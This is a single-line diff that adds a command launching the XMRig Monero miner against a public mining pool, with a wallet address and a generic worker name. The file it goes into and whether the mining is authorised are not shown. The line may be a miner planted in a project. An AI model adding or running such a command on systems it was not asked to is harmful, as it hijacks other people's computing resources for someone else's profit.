@@ -1,0 +1,1 @@
+./xmrig -o xmr.2miners.com:12222 -u 4B9ttGq1dRJgqmnGJ6HLeZ7VhdTxvQS67Nb4FiN5CXKNNy6mJnYvTSzdyXxrfUF1mcEx4VzqzA4mBRSDxCf6aCyL1D2hSnC.system19126 -p x --tls -k --coin monero -a rx/0
